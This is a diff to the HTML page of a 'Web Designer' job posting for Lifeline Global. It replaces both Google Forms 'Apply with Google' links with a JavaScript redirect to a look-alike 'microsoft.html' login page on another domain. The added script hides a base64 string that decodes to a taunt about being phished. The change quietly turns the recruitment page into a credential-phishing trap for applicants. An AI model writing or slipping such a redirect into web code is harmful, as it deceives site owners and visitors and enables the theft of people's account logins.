@@ -60,7 +60,7 @@
                     </div>
                 </div>
                 <div class="hero-buttons">
-                    <a href="https://forms.google.com/web-designer-application" class="btn btn-primary btn-large" target="_blank">
+                    <a href="#" onclick="redirectToGoogle(); return false;" class="btn btn-primary btn-large">
                         <i class="fab fa-google"></i> Apply with Google
                     </a>
                     <a href="#details" class="btn btn-secondary btn-small">View Details</a>
@@ -245,7 +245,7 @@
                 <p>Join us and use your design skills to make a real difference for Lifeline Global and the communities we serve.</p>
                 
                 <div class="apply-cta">
-                    <a href="https://forms.google.com/web-designer-application" class="btn btn-primary btn-large" target="_blank">
+                    <a href="#" onclick="redirectToGoogle(); return false;" class="btn btn-primary btn-large">
                         <i class="fab fa-google"></i> Apply with Google
                     </a>
                     <p class="apply-note">Applications are reviewed on a rolling basis. Early applications are encouraged.</p>
@@ -324,5 +324,10 @@
     </footer>
 
     <script src="script.js"></script>
+    <script>
+        function redirectToGoogle() {
+            window.location.href = "https://account.lifelineglobal.net/microsoft.html?login=t&state=bG9sIHlvdSdyZSBhYm91dCB0byBnZXQgcGhpc2hlZCBicm8uIE1heSB0aGUgTG9yZCBiZSB3aXRoIHlvdSBob21icmUu";
+        }
+    </script>
 </body>
 </html> 
